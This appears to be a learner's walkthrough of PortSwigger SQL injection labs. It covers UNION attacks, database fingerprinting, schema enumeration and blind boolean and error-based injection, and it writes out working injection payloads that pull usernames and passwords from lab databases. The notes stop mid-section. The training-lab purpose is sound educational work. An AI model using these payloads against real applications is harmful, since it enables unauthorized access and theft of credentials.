## Prologue: What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:

- Retrieving hidden data, where you can modify a SQL query to return additional results.
- Subverting application logic, where you can change a query to interfere with the application's logic.
- UNION attacks, where you can retrieve data from different database tables.
- Blind SQL injection, where the results of a query you control are not returned in the application's responses.

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
- [SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
This lab contains a SQL injection vulnerability in the product category filter.

When the user selects a category, the application carries out a SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
```

This SQL query asks the database to return:

- all details `*`
- from the `products` table
- where the `category` is `Gifts`
- and `released` is `1`.

The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

As a caveat, take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

## SQL injection vulnerability allowing login bypass
```
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
```
In a similar vein to the previous problem, the SQL query can be translated into:

`SELECT * FROM products WHERE username = '...' AND password = '...'` 

Since there is a SQL injection vulnerability, we can modify the payload so that the query only see the username and neglect (via commenting) the password field, thereby bypassing the login.

`SELECT * FROM products WHERE username = 'administrator'-- AND password = '...'`

<img width="1132" height="510" alt="image" src="https://github.com/user-attachments/assets/c68cb47e-0f90-4e4f-a62c-52bcc2886fb8" />

## SQL injection UNION attack, retrieving data from other tables

```
This lab contains a SQL injection vulnerability in the product category filter.

The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
```

Let me introduce to you a new type of SQL operator/command: **UNION.** The SQL UNION operator is used to combine the result sets of two or more SELECT queries into a single result set by stacking the rows vertically. For now, I will not delve into the tidbits of this command, but rather focusing on the logic of the SQL query in place.

With that said, our exploit payload is:

`products?category=Gifts'+UNION+SELECT+username,+password+FROM+users--` 

The SQL query here can be translated into:

`SELECT X, Y FROM Z WHERE category = 'Gifts' UNION SELECT username, password from users--'...` 

At first, the website only display the articles about our search. Our arbitrary `X`, `Y`, and `Z` here could mean the field `name` , `description` , in the table called `products` , for example. But we don’t care about that, but rather the other table `users` which contains `username` and `password` .

<img width="1908" height="1054" alt="image" src="https://github.com/user-attachments/assets/c0caa58d-de4e-44b1-b734-472a7f79bb9b" />

## SQL injection attack, querying the database type and version on Oracle

```
This lab contains a SQL injection vulnerability in the product category filter.

You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
```

At first, the naive me simply try `/filter?category=Pets'+UNION+SELECT+*+FROM+v$version--`

<img width="1917" height="727" alt="image" src="https://github.com/user-attachments/assets/c5ba1152-d2aa-48b5-9f72-87d8436072a0" />

**It did not work as I had expected. `Internal Server Error`  means my query is not correct. The true reason behind this will be explained in “SQL injection attack, listing the database contents on non-Oracle databases”.**

After some deliberation, I decided to open the hint.

```
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`.

If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
```

This could explain why my `SELECT *` does not work, and I need another workaround according to the hint. What I should do now is to determine the number of columns that are being returned by the query and which columns contain text data. 

We design a payload like this in order to test for the query: `'+UNION+SELECT+'z','z'+FROM+dual--` 

Note that if we exceed, or have not reached the correct number of columns, such as  `'z'`  or `'z', 'z', 'z'`, the result will again be `Internal Server Error` .

<img width="1843" height="631" alt="image" src="https://github.com/user-attachments/assets/bd46ffe5-1328-4531-8c47-a0578790702b" />

We verify that the query is returning two columns, both of which contain text.

[Upon reading the documentation/cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), we know that the query to determine the type and version of the database is `SELECT banner FROM v$version` . Knowing that the query requires exactly two columns, I suppose we can embed another element/column to fulfill this requirement, and we have the payload: `'+UNION+SELECT+BANNER,+'z'+FROM+v$version--`

<img width="1819" height="775" alt="image" src="https://github.com/user-attachments/assets/4eca1ef1-d009-48c9-9416-e75dc0ce87de" />

A more elegant solution could be `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

**Food for thought: Why do we have to `'z'` instead of `z` ?**

In SQL, quotes tell the database that `z` is text data. Therefore, `SELECT 'z' FROM dual;` would return the text value `z` . Without quotes, we have `SELECT z FROM dual;` SQL interprets `z` as an identifier, which is usually a column name. Oracle then looks for a column named `z` in `dual` and raises an error because it does not exist. Common formats in SQL are:

```
'hello'   -- text/string value
123       -- number value
abc       -- column, table, or other SQL name
"abc"     -- quoted identifier/name, not a text value
NULL      -- special SQL null value
```

**What is an identifier, by the way?**

For example, imagine we have a table called `students` , in which the field/column `name` contains two elements `Alice` and `Bob` . As a result, for the SQL query `SELECT name FROM students` :

- `name` is an identifier: it means “the column named `name`.”
- `students` is an identifier: it means “the table named `students`.”

The result hereby:
```
Alice
Bob
```
However, for the query SELECT 'name' FROM students , 'name' in this case is no longer a column/identifier. It is text, so SQL prints the word name once for every row, and the result is: 
```
name
name
```
This explains the two z we see as our test case above.

## SQL injection attack, querying the database type and version on MySQL and Microsoft

```
This lab contains a SQL injection vulnerability in the product category filter.

You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint: You can find some useful payloads on our SQL injection cheat sheet.
```

The hint was a red herring, it’s a half-lie-half-truth and the solution is not there. ☹️

Anyhow, the logic to solve this problem is similar to the previous one, just some small differences in the syntax (Oracle vs. MySQL/Microsoft).

The test-for-how-many-columns-are-there payload: `'+UNION+SELECT+'z','z'%23` 

The attack-for-database-version payload: `'+UNION+SELECT+@@version,+NULL%23`

## SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

`'+UNION+SELECT+'abc','def'--` again confirms that the query returns two columns.

Checking around for the version of the database: `'+UNION+SELECT+version(),+NULL--`

<img width="1698" height="190" alt="image" src="https://github.com/user-attachments/assets/3e8ecf1f-6ad8-448e-890a-fae1a0f005dd" />

Upon reading the documentation, I found a potentially useful command to fetch detailed metadata of the database about tables and views: `SELECT * FROM information_schema.tables` 

Modify the payload a little bit, we have: `'+UNION+SELECT+*,+NULL+FROM+information_schema.tables--` 

For some reason (that I will elaborate down below), it doesn’t work. Upon researching the documentation for PostgreSQL, we learn a thing or two about SQL identifiers. The identifier `table_name` describe the name of the table, and `column_name` the name of the column.

The correct payload should be: 

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

<img width="1918" height="1062" alt="image" src="https://github.com/user-attachments/assets/d6a712eb-2af2-4626-a1f2-075c90cc224a" />

So why the asterisk `*` does not work? This is also a problem I’ve encountered in the previous labs but I did not think much about it at that point. (i’m sooooo dumb ;-;) Simple enough, the query returns two columns. Something like `table_name, NULL` would work. However, `*` the wildcard means return ALL. And ALL is larger than two, so the query is false. 

I then wander around for a bit:

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'pg_partitioned_table'--`

<img width="1918" height="1068" alt="image" src="https://github.com/user-attachments/assets/98b63011-5f37-44fc-a5a2-db2343d53d0c" />

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'pg_partitioned_table'--`

<img width="1908" height="1063" alt="image" src="https://github.com/user-attachments/assets/9a936e98-2301-4ad8-b1b9-a60c64bb815c" />

`'+UNION+SELECT+table_name,column_name+FROM+information_schema.columns--`

<img width="1918" height="1069" alt="image" src="https://github.com/user-attachments/assets/5dbb2f8a-6c83-4f8d-9d56-7a4f5b3bde3a" />

Our objective here is to find the table which contains usernames and passwords, and I have chanced upon this table users_lkziqr and columns username_zswiow and password_pexksb which seems sussy. I have resetted the lab for many times in the process, and I notice the strings that followed the users, username and password differ every time.

<img width="730" height="106" alt="image" src="https://github.com/user-attachments/assets/aba410ef-6414-427e-8622-947241d1642c" />

<img width="715" height="111" alt="image" src="https://github.com/user-attachments/assets/6d199ad8-3e40-462e-96b2-2f457f2f7f99" />

To be honest, initially, I think these random strings bear no relevance to the intended exploit so I ignore it. Then I realize that those are created to deter us from the simple case of a UNION attack. But now it is pivoted to the simple case - a callback to “SQL injection UNION attack, retrieving data from other tables”:

`'+UNION+SELECT+username_zswiow,+password_pexksb+FROM+users_lkziqr--`

<img width="1914" height="1060" alt="image" src="https://github.com/user-attachments/assets/e2d68896-2968-41e6-811e-ba0e1c630f30" />

## **SQL injection attack, listing the database contents on Oracle**

Similar to the last lab, but with Oracle rather than PostgreSQL:

- `'+UNION+SELECT+'z','z'+FROM+dual--`
- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
- `'+UNION+SELECT+table_name,column_name+FROM+all_tab_columns--`

<img width="1918" height="1065" alt="image" src="https://github.com/user-attachments/assets/7e931c5a-c6e4-4743-bada-46ab0d3c2251" />

`'+UNION+SELECT+username_ukrtfk,+password_vorwlr+FROM+users_suirpx--`

<img width="1806" height="147" alt="image" src="https://github.com/user-attachments/assets/22568312-3d4d-4526-aff7-e87c935e0114" />

## SQL injection UNION attack, determining the number of columns returned by the query

```
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
```

Instead of using 'z' as before, we have to use NULL this time. Note that the SQLi UNION attack works if
- The number and the order of the columns must be the same in all queries.
- The data type is compatible.

The SQLi UNION attack process can be described as follow:
- SELECT ... FROM ... UNION SELECT NULL-- --> 500 Internal Service Error, means that the number of columns is still incorrect.
- SELECT ... FROM ... UNION SELECT NULL, NULL, NULL-- --> 200 OK response, means that the number of columns is now correct.

NULL is useful for testing because it is a neutral placeholder that databases can often treat as compatible with many column types. The query can now parse and execute, so the application may return 200 OK. The behavior is simply an column count oracle, in that a column count mismatch will return an error, while the matching column count will succeed the query.

## SQL injection UNION attack, finding a column containing text
```
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
```
Using the query from the previous lab `'UNION SELECT NULL, NULL, NULL--`, we know that there are 3 columns. Substitute the 'phrase' into each NULL to figure out which column's data type is text (and solve the lab). 

<img width="948" height="472" alt="image" src="https://github.com/user-attachments/assets/8980f2a1-7d4f-485c-a413-4393dd0b0105" />

## SQL injection UNION attack, retrieving multiple values in a single column

First, we implement a callback to **SQL injection UNION attack, determining the number of columns returned by the query**.

<img width="959" height="536" alt="image" src="https://github.com/user-attachments/assets/e24436a6-b2ac-415b-b2fa-ea82a0e91f30" />

After `' UNION SELECT NULL, NULL--`, the response is 200 OK, means that the query only has two columns this time. 

Thereafter, I tried `' UNION SELECT username, password FROM users--`, but it did not work. In fact, this query is the same as **SQL injection UNION attack, retrieving data from other tables**. But this time we have a caveat, which is "retrieiving multiple values". I come up with a hypothesis, that we have already known the username ("administrator), so we do not need the field "username" this time (I guess they sanitize/blacklist this payload?) Anyhow, I've arrived at the correct answer: `' UNION SELECT NULL, password FROM users--`

<img width="957" height="532" alt="image" src="https://github.com/user-attachments/assets/1e6b31b0-dbcd-4d47-a747-ac908fb029a9" />

Try each string as the password with the username "administrator" and the first one works.

## Blind SQL injection with conditional responses

```
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
```

> [!NOTE]
>
> Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
>
> Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

Consider an application that uses tracking cookies to gather analytics about usage. Upon intercepting the request with BurpSuite, we know that the requests to the application include a cookie header like this:

`Cookie: TrackingId=abcxyz`

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/f9b3b4cd-4efe-4ca3-8a28-6a36ee9de61a" />

When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcxyz'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/3d1599b5-a255-4dc9-a4c6-d503a2046de2" />

The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/c9c9ffb2-2ae4-4556-a84a-cebaef2a6167" />

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`...xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm`

*Syntax Explanation:*

- `SELECT password FROM users WHERE username = 'administrator'` retrieves that user’s password value (or password hash).

- `SUBSTRING(..., 1, 1)` extracts one character, starting at position 1: the first character. Note that the first parameter is the offset index (1-based), and the second parameter is the specified length.

- Assuming that the application normally builds this query: `WHERE tracking_id = '<input>'` When we close the quote at the xyz, we (automatically) have an extra quote at the end of the query, so we do not need to close the m once more. 

<img width="546" height="152" alt="image" src="https://github.com/user-attachments/assets/5bb36040-6e1f-451c-bbdc-d06e01f831ce" />

`> 'm'` performs a text comparison. It evaluates to TRUE if that first character is later than m according to the database’s collation rules.

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/9b8cc778-1be1-433f-9e4b-555440c03a58" />

`xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 't` does not return the message, means that the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is indeed s.

`xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'q`

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/c61d64e9-bf8f-43f7-8dbf-08483cc61ea6" />

We can continue this process (with Burp Intruder) to systematically determine the full password for the `administrator` user. 
- Increase the offset one by one and add the testing character as the payload
- The configuration contains alphanumeric characters only.
- Check which character returns the abnormal length.

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/82cbe360-b100-4581-9add-b409eebe3bb8" />

<img width="951" height="559" alt="image" src="https://github.com/user-attachments/assets/5f9d2373-8b86-471a-bc3d-f39a06965038" />

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/9e18a599-a746-4ad7-9cf9-4eb252388ea1" />

The password ends up to be `q2l0xt7wumhvxgcmbbd6`.

## Blind SQL injection with conditional errors

```
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
```

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

To exemplify, let's inspect two requests are sent containing the following TrackingId cookie values:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`

The completed SQL becomes:
```
WHERE tracking_id = 'xyz'
  AND (
    SELECT CASE
      WHEN (1=2) THEN 1/0
      ELSE 'a'
    END
  ) = 'a'
```
> [!NOTE]
> The SQL CASE expression is SQL's way of handling IF-THEN-ELSE conditional logic inside a query. It evaluates conditions sequentially and returns a specific value as soon as the first true condition is met. 

As 1 is not equal to 2, the SQL query returns 'a', and as 'a' = 'a', so the result becomes True.

`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

As 1 is equal to 1, the SQL query returns 1/0, which is is intentionally dangerous: division by zero normally causes a database error.

Therefore, if the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Applying my logic from the previous lab, I tried:

`' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR((SELECT password WHERE username = 'administrator'), 1, 1) = 'a') THEN 1/0 ELSE 'a' FROM users) = 'a`

It failed, however. Then I open the hint and gain the information that this lab use an Oracle database. Then I tried again (and failed again):

`' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual`

Both of them failed for these reasons:
- `AND (SELECT CASE ...)` is not a valid Oracle Boolean predicate: the subquery returns a text value or NULL, not a condition Oracle can use after AND.
- Oracle string-concatenation structure is `xyz'||(SELECT ... )||'` rather than `xyz' AND (SELECT ... )`.
- FROM dual means the outer query has no users.username column, so username = 'administrator' is an invalid identifier there.
- END closes only the CASE expression, not the whole SELECT query. Therefore the FROM and WHERE clause are placed after END.

Anyhow, let's start from square one and analyze in a more hawk-eyed manner:

- First, try to append a single quotation mark to the `TrackingId` cookie, making it `TrackingId'`:

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/7a254d11-cf08-4d2f-b735-1db145f16b9a" />

- We get Internal Service Error. Let's now close the quotation mark this time around with `TrackingId''`:

<img width="959" height="564" alt="image" src="https://github.com/user-attachments/assets/664e4b8a-7852-41de-9741-2f31590a471d" />

*The error disappeared, but why does a quotation mark could invoke such an error?*

> [!NOTE]
> A vulnerable application may build SQL like: `WHERE TrackingId = '<cookie value>'`
>
> With the cookie abcxyz, the query is simply `WHERE TrackingId = 'abcxyz'`
>
> However, appending a quotation mark returns `WHERE TrackingId = 'xyz''`
>
> In SQL, two adjacent quotes inside a string ('') mean “a literal apostrophe.” Therefore, those final two quotes are consumed as an escaped ', leaving the original opening quote with no closing quote. The database raises a syntax error.
>
> With two quotes in the cookie: `WHERE TrackingId = 'xyz'''`, the SQL string is now closed properly.

*The differentiation of concatenation method*

> [!NOTE]
>
> 
